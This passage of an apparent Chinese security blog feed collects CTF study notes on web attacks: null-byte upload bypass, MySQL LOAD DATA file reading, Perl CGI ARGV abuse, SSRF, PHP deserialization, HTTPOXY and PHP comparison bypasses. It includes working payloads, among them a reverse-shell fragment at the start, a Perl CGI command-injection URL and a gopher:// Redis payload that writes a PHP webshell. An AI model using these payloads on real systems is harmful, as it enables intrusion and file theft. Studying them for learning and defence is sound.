/bin/bash 1&gt;backpipe 2&gt;backpipe</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>00截断</title>
      <link href="/2020/04/21/00%E6%88%AA%E6%96%AD/"/>
      <url>/2020/04/21/00%E6%88%AA%E6%96%AD/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/qq_26090065/article/details/81458937" target="_blank" rel="noopener">00截断原理分析</a> </p><h1 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h1><p>在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p><p>比如</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.txt</a>                                此时输出的是test.txt</p><a id="more"></a><p>加上%00</p><p><a href="https://mp.csdn.net/upfiles/?filename=test.php%00.txt" target="_blank" rel="noopener">https://mp.csdn.net/upfiles/?filename=test.php%00.txt</a>                   此时输出的是test.php</p><p>就绕过了后缀限制，可以上传webshell啦。</p><h1 id="0X00截断"><a href="#0X00截断" class="headerlink" title="0X00截断"></a>0X00截断</h1><p> 然后打开hex,（空格的16进制为0x20）修改16进制内容，把20改成00： </p><h1 id="php-00截断"><a href="#php-00截断" class="headerlink" title="php 00截断"></a>php 00截断</h1><blockquote><p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p><p>magic_quotes_gpc需要为OFF状态</p></blockquote><p>include和require一般在网站内部读取文件</p><p>file_get_contents一般用于打开一个url或一个文件</p><p>file_exists判断文件是否存在</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mysql任意文件读取</title>
      <link href="/2020/04/21/mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
      <url>/2020/04/21/mysql%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.anquanke.com/post/id/173039" target="_blank" rel="noopener">从一道ctf题学习mysql任意文件读取漏洞</a><br><a href="http://www.lin2zhen.top/index.php/archives/78/" target="_blank" rel="noopener">mysql任意文件读取漏洞学习</a><br><a href="https://www.vulnspy.com/cn-phpmyadmin-load-data-local-file-read-local-file/" target="_blank" rel="noopener">phpMyAdmin LOAD DATA INFILE 任意文件读取漏洞</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p> mysql客户端登陆mysql服务端后，客户端执行语句<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，从而可以导致mysql进行本地或远程读取文件。这个原漏洞被爆出在去年<a href="http://aq.mk/index.php/archives/23/" target="_blank" rel="noopener">phpmyadmin任意文件读取漏洞</a>。 </p><a id="more"></a><p>如果phpmyadmin开启了如下选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$cfg[&apos;AllowArbitraryServer&apos;] = true; //false改为true</span><br></pre></td></tr></table></figure><p>则登录时就可以访问远程的服务器。当登陆一个恶意构造的Mysql服务器时，即可利用load data infile读取该服务器上的任意文件。当然前提条件是<code>secure_file_priv</code>参数允许的目录下，且phpmyadmin的用户对该文件有读的权限。</p><h1 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a><strong>漏洞细节</strong></h1><p>LOAD DATA LOCAL导致的任意文件读取是个由来已久的问题，根据前人们的研究：</p><p><a href="https://lightless.me/archives/read-mysql-client-file.html" target="_blank" rel="noopener">Read MySQL Client’s File</a><br><a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/" target="_blank" rel="noopener">MySQL connect file read</a><br>我们知道下列的下列情况都存在该问题：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL Client</span><br><span class="line">PHP + mysql/mysqli</span><br><span class="line">PHP + PDO (MYSQL_ATTR_LOCAL_INFILE)</span><br><span class="line">Python + MySQLdb</span><br><span class="line">Python3 + mysqlclient</span><br><span class="line">Java + JDBC Driver</span><br></pre></td></tr></table></figure><p>phpMyAdmin 属于典型的 php+mysqli 组合，当 AllowArbitraryServer 开启的情况下（默认关闭），我们可以让phpMyAdmin连接到恶意的MySQL服务器来触发任意文件读取漏洞。</p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a><strong>漏洞利用</strong></h1><p> <strong>EXP:</strong> <a href="https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py" target="_blank" rel="noopener">https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py</a> </p><p> <strong>1.</strong> 首先是配置恶意服务器。在db服务器的命令行里修改root/exp/rogue_mysql_server.py文件，设port为3306外的其他端口，这里设为3307，然后在filelist中选择一个要读取的文件。我们这里读取/etc/passwd文件。 </p><p> <strong>2.</strong> 运行python rogue_mysql_server.py，启动服务，服务会监听3307端口。 </p><p> <strong>3.</strong> 打开phpMyAdmin的登录页面，地址输入db:3307、用户密码随意输，提交登录 </p><p> 然后会发现生成一个mysql.log日志，查看日志 </p><p> 在日志中我们看到成功读取了passwd文件。 </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>perl网页文件</title>
      <link href="/2020/03/26/perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6/"/>
      <url>/2020/03/26/perl%E7%BD%91%E9%A1%B5%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="perl-CGI"><a href="#perl-CGI" class="headerlink" title="perl CGI"></a>perl CGI</h1><p><a href="https://www.guildhab.top/?p=867" target="_blank" rel="noopener">Web – I-got-id-200 – WriteUp</a></p><ul><li><p><strong>要使用 Perl CGI ， 首先要加载 CGI 模块</strong></p><p><strong><code>use CGI;</code></strong></p></li><li><p><strong>CGI模块具有预编程功能 ， 可用于Internet . 但在使用前必须创建CGI的句柄 =&gt; 允许我们访问相关的函数</strong></p><p><strong><code>my $cgi = CGI-&gt;new();</code></strong></p><p>现在 $cgi 正在加载 CGI 标准函数 , 有关 CGI 标准函数的内容可以参考 <strong><a href="http://www.freeoa.net/development/perl/perl-cgi-fun-intro_2195.html" target="_blank" rel="noopener">Perl CGI 主要函数功能简介</a></strong></p></li><li><p><strong>本题的环境是一个文件上传 ， 而在上面的链接中有讲到 upload() 这个CGI标准函数</strong></p><p>upload() 函数是用于处理文件上传的标准函数 ， 参数为在构造表单时 ` 设置的 name 的值 .</p><p>回到之前抓到的数据包 ， name 参数的值为 “ file ” , 文件上传的过程应该是这样的 :</p><p><strong><code>if ( $cgi-&gt;upload(&quot;file&quot;) ) { ... }</code></strong></p><p>if 语句确定了这是一个文件上传操作 ， <strong>后面的步骤都是在这个 if 语句中进行的</strong> .</p></li><li><p><strong>获取到参数</strong></p><p>在服务器处理之前 ， 需要先检索输入 . 再对它们进行处理 .</p><p><strong>在 Perl CGI 标准函数中 ， <code>param()</code> 函数用于获取传入的参数</strong>( 可以接收 GET方法 和 POST方法 传递的参数， 类似 PHP 中的 <code>$REQUEST</code> 全局变量 )</p><p>根据之前抓到的数据包 ， 这里的参数应该为 “ file “ ， 所以代码应该是这样的 .</p><p><strong><code>my $file= $cgi-&gt;param(&#39;file&#39; );</code></strong></p><p><em>下面就可以读取文件内容了</em></p></li><li><p><strong>读取文件</strong></p><p><strong>Perl 使用一种叫做文件句柄类型的变量来操作文件 ， 从文件读取或者写入数据都需要使用到文件句柄 .</strong></p><p><strong>文件句柄( file handle )是一个I/O连接的名称 , Perl 中提供了三种文件句柄 : STDIN , STDOUT , STDERR , 分别代表标准输入 ， 标准输出 ， 标准错误输出</strong></p><p><strong>这里就要使用到 Perl 中的尖括号运算符( &lt;&gt; )了</strong> , 它有如下的用途</p><ol><li>如果尖括号中间是文件句柄 ， 尖括号运算符允许读取文件句柄</li><li>如果尖括号中间是搜索模式 ， 尖括号运算符能返回与该模式相匹配的的文件列表 ，这被称为一个 glob ， 比如 &lt;*.bat&gt;</li><li>如果尖括号内没有任何内容 ， 那么它可以读取命令行上所有的文件内容 ， 如果没有文件名 ， 则可以读取标准输出</li></ol><p>这里需要使用 <strong>读取文件句柄</strong> 这个功能</p></li><li><p><strong>输出文件内容</strong></p><p>前面读取到了文件句柄 ， 那么如何输出文件的内容呢 ?</p><p><strong>这里要用到 Perl 中的特殊变量 <code>$_</code></strong></p><p><code>$_</code> 是默认参数的意思，指的是在不指定的情况下，程序处理的上一个变量 .</p><p><strong>比如打开一个文本文件 ， 读取每一行 ，在没有指定参数的情况下 ， <code>$_</code> 指向从文件中读取的每一行 .</strong></p><p>因此 ， 若想要读取某个文件的内容 ， <strong>可以写一个循环 ， 逐行读取文件的内容</strong></p><p><strong><code>while ( &lt;$file&gt; ) { print &quot;$_&quot;; }</code></strong></p><p> <strong>Perl 中的 ARGV 全局特殊文件句柄</strong> </p><ul><li><p>Perl 会将 perl 命令行参数列表放入到数组 @ARGV 中 ， 而默认情况下 ， 这些命令行参数是 Perl 的数据输入源 ， 也就是 <strong>Perl 会以依次将他们当作文件进行读取</strong></p></li><li><p><strong>param()函数会返回一个列表的文件 ， 但是根据后端代码 ， 只有第一个文件会被放入到 `` 变量中</strong></p><p><strong>这里就存在可利用的点!</strong></p></li><li><p><strong>如果在原来的数据包中新增一个文件上传项 ， 并且删除其 filename 参数 ，</strong> </p><blockquote><p><strong>在 URL 后添加的路径会被放入到 @ARGV 数组中 ， 配合之前引入的 ARGV 文件句柄 ， 我们就可以读取任意文件 !</strong> </p></blockquote></li></ul></li></ul><a id="more"></a><h1 id="param-函数"><a href="#param-函数" class="headerlink" title="param()函数"></a>param()函数</h1><p> param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的接收变量中。如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。对正常的上传文件进行修改,可以达到读取任意文件的目的: </p><blockquote><p>bp进行抓包，将上传的文件类型及文件内容处复制再粘贴一行，将filename去掉，然后内容填入ARGV ，删除提交文件类型</p></blockquote><blockquote><p>perl文件遇到上传可配合ARGV文件使用造成任意文件读取，然后任意文件读取可利用bash执行一定的命令。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/file.pl?/bin/bash%20-c%20ls$&#123;IFS&#125;/|</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2020/03/25/SSRF/"/>
      <url>/2020/03/25/SSRF/</url>
      
        <content type="html"><![CDATA[<h1 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h1><p><a href="https://www.jianshu.com/p/90a34b08a416" target="_blank" rel="noopener">web安全之 – SSRF攻击</a></p><p><a href="https://www.cnblogs.com/20175211lyz/p/11408583.html" target="_blank" rel="noopener">CTF SSRF(服务器端伪造请求)</a></p><p><a href="https://www.cnblogs.com/ophxc/p/12872815.html" target="_blank" rel="noopener">Redis利用，攻击内网（ssrf）)</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>SSRF （Server-side Request Forge, 服务端请求伪造）</strong><br> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><a id="more"></a><h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p><p>举个栗子，漏洞代码ssrf.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 漏洞代码ssrf.php</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先curl查看版本以及支持的协议</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@localhost <span class="symbol">:curl</span> -V</span><br><span class="line">curl <span class="number">7.54</span>.<span class="number">0</span> (x86_64-apple-darwin17.<span class="number">0</span>) libcurl/<span class="number">7.54</span>.<span class="number">0</span> LibreSSL/<span class="number">2.0</span>.<span class="number">20</span> zlib/<span class="number">1.2</span>.<span class="number">11</span> nghttp2/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line"><span class="symbol">Protocols:</span> dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line"><span class="symbol">Features:</span> AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br></pre></td></tr></table></figure><p>可以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。</p><p>dict协议探测端口</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://172.0.0.1:22/info'</span></span><br><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://127.0.0.1:6379/info'</span></span><br></pre></td></tr></table></figure><p>利用gopher协议访问redis反弹shell  6379端口</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gopher:<span class="comment">//ip:port/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2432%0D%0A%0A%0A%3C%3Fphp%20system%28%22cat%20/flag%22%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span></span><br><span class="line">ip port shell.php</span><br></pre></td></tr></table></figure><p><strong>同时 <code>file_get_contents()</code>、<code>fopen()</code>、<code>fsocksopen()</code> 均可能造成SSRF漏洞</strong></p><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者利用ssrf可以实现的攻击主要有5种：</p><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等。</p><p>常用的利用思路：</p><p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p><p>1.内网探测: 内网主机信息收集</p><p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p><p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p><p>4.Payload Result: 返回相应Payload的执行信息</p><h3 id="常见的存在漏洞的参数："><a href="#常见的存在漏洞的参数：" class="headerlink" title="常见的存在漏洞的参数："></a>常见的存在漏洞的参数：</h3><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p><p>可以结合google语法及上述关键字进行搜索验证。</p><h3 id="常见的容易出问题的函数："><a href="#常见的容易出问题的函数：" class="headerlink" title="常见的容易出问题的函数："></a>常见的容易出问题的函数：</h3><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p><p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p><h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、排除法</p><p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p><p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p><p><strong>排除法一：</strong></p><p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p><strong>排除法二：</strong></p><p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p><h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul><li><p>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p></li><li><p>服务端需要认证交互，禁止非正常用户访问服务；</p></li><li><p>过滤输入信息，永远不要相信用户的输入，判断用户的输入是否是一个合理的URL地址</p></li><li><p>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法，如果web应用是去获取某一种类型的文件。那么在把返* 回结果展示给用户之前先验证返回的信息是否符合标准。</p></li><li><p>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p></li><li><p>禁止30x跳转</p></li><li><p>设置URL白名单或限制内网IP</p></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><blockquote><p>绕过url后面拼接</p><p> 通过在URL后加 “?a=(GET赋值给一个参数)” 或 “#(锚点)” 来让其失效 </p></blockquote><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p> 这是一个php内置的类，当__call方法被触发后，它可以发送HTTP和HTTPS请求。该类的构造函数如下： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public SoapClient :: SoapClient （mixed $wsdl [，array $options ]）</span><br></pre></td></tr></table></figure><p>第一个参数是用来指明是否是wsdl模式。</p><p>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。<br>知道上述两个参数的含义后，就很容易构造出SSRF的利用payload了。我们可以设置第一个参数为null，然后第二个参数的location选项设置为target_url</p><p> SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。<br>简单的用法 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = new SoapClient(null,array(location&apos;=&gt;&apos;http://example.com:2333&apos;,&apos;uri&apos;=&gt;&apos;123&apos;));</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c = unserialize($b);</span><br><span class="line">$c-&gt;a();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反序列化</title>
      <link href="/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html" target="_blank" rel="noopener">CTF PHP反序列化</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96" target="_blank" rel="noopener">CTF PHP反序列化</a><br><a href="https://www.freebuf.com/articles/web/221213.html" target="_blank" rel="noopener">PHP反序列化漏洞入门</a></p><h2 id="php-反-序列化常见的函数"><a href="#php-反-序列化常见的函数" class="headerlink" title="php(反)序列化常见的函数"></a>php(反)序列化常见的函数</h2><blockquote><p>Serialize、Unserialize、json_encode、json_decode。 </p></blockquote><h2 id="php对象常见的魔幻函数"><a href="#php对象常见的魔幻函数" class="headerlink" title="php对象常见的魔幻函数"></a>php对象常见的魔幻函数</h2><a id="more"></a><ul><li>__construct： 在创建对象时候初始化对象，一般用于对变量赋初值。</li><li>__destruct： 和构造函数相反，当对象所在函数调用完毕后执行。</li><li>__toString：当对象被当做一个字符串使用时调用。</li><li>__sleep:序列化对象之前就调用此方法(其返回需要一个数组)</li><li>__wakeup:反序列化恢复对象之前调用该方法</li><li>__call:当调用对象中不存在的方法会自动调用该方法。</li><li>__get:在调用私有属性的时候会自动执行</li></ul><h2 id="serialize-hander处理session方式不同导致session注入"><a href="#serialize-hander处理session方式不同导致session注入" class="headerlink" title="serialize_hander处理session方式不同导致session注入"></a>serialize_hander处理session方式不同导致session注入</h2><p>简单看：<br>serialize_handler=php<br>解释：</p><p>这样的方式，可以指定php序列化引擎,而不同引擎存储的方式也不同<br>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。<br>存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。<br>在php.ini中存在三项配置项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=&quot;&quot;   --设置session的存储路径</span><br><span class="line">session.save_handler=&quot;&quot; --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认是php(5.5.4后改为php_serialize)</span><br></pre></td></tr></table></figure><blockquote><p>ini_set(‘session.serialize_handler’, ‘php’);</p></blockquote><p>session.serialize_handler存在以下几种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值</span><br><span class="line">php 键名+竖线（|）+经过serialize()函数处理过的值</span><br><span class="line">php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化</span><br></pre></td></tr></table></figure><p>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。<br>本题中，我们利用的是<strong>session反序列化和序列化时候使用不同引擎的时候，即可触发漏洞</strong><br>例如传入$_SESSION[‘name’]=’|O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}’; 序列化引擎使用的是php_serialize，那么储存的session文件为<br>a:1:{s:4:”name”;s:5:”|O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}”;}</p><p>而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把a:1:{s:4:”name”;s:5:”当作键名，而把O:5:”xxxxx”:1:{s:4:”test”;s:3:”AAA”;}当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。</p><h2 id="phar-反序列化"><a href="#phar-反序列化" class="headerlink" title="phar://反序列化"></a>phar://反序列化</h2><p><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">PHAR反序列化拓展操作总结</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>常见源码泄露</title>
      <link href="/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/"/>
      <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/NPFS/p/12746349.html" target="_blank" rel="noopener">WEB源码泄露</a> </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HTTPOXY漏洞</title>
      <link href="/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/03/17/HTTPOXY%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.laruence.com/2016/07/19/3101.html" target="_blank" rel="noopener">HTTPOXY漏洞</a></p><p> Guzzle<code>&gt;=4.0.0rc2,&lt;6.2.1</code>版本受此影响 </p><table><thead><tr><th align="center">Language</th><th align="center">Environment</th><th align="center">HTTP client</th></tr></thead><tbody><tr><td align="center">PHP</td><td align="center">php-fpm mod_php</td><td align="center">Guzzle 4+ Artax</td></tr><tr><td align="center">Python</td><td align="center">wsgiref.handlers.CGIHandler twisted.web.twcgi.CGIScript</td><td align="center">requests</td></tr><tr><td align="center">Go</td><td align="center">net/http/cgi</td><td align="center">net/http</td></tr></tbody></table><a id="more"></a><h3 id="漏洞原因"><a href="#漏洞原因" class="headerlink" title="漏洞原因"></a>漏洞原因</h3><blockquote><p>在CGI(RFC 3875)的模式的时候， 会把请求中的Header， 加上HTTP_ 前缀， 注册为环境变量, 所以如果你在Header中发送一个Proxy:xxxxxx, 那么PHP就会把他注册为HTTP_PROXY环境变量， 于是getenv(“HTTP_PROXY”)就变成可被控制的了. 那么如果你的所有类似的请求， 都会被代理到攻击者想要的地址，之后攻击者就可以伪造，监听，篡改你的请求了… </p></blockquote><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><blockquote><ul><li>代码以cgi模式运行，其中使用环境变量<code>HTTP_PROXY</code></li><li>信任 HTTP 客户端<code>HTTP_PROXY</code>并将其配置为代理</li><li>在请求处理程序中使用的该客户端发出HTTP（与HTTPS相对）请求</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>MD5绕过</title>
      <link href="/2020/03/17/MD5%E7%BB%95%E8%BF%87/"/>
      <url>/2020/03/17/MD5%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<p>比较md5加密后的值是否为0，可以把value变成数组可以绕过</p><blockquote><p>因为md5加密一个数组值为null，而null==0</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2020/03/17/php%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="exif-imagetype"><a href="#exif-imagetype" class="headerlink" title="exif_imagetype()"></a>exif_imagetype()</h2><blockquote><p><code>exif_imagetype()</code>函数判断是不是图片，这个很好绕过，在文件头添加图片头就可以了，例如<code>gif</code>的文件头<code>GIF89a</code> </p></blockquote><h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><blockquote><p>列出 参数目录 中的文件和目录</p></blockquote><a id="more"></a><h2 id="addslashes"><a href="#addslashes" class="headerlink" title="addslashes()"></a>addslashes()</h2><blockquote><p>在指定的预定义字符前添加反斜杠。这些预定义字符是：</p><ul><li>单引号 (‘)</li><li>双引号 (“)</li><li>反斜杠 ()</li><li>NULL</li></ul></blockquote><h2 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h2><blockquote><p>用数组即可 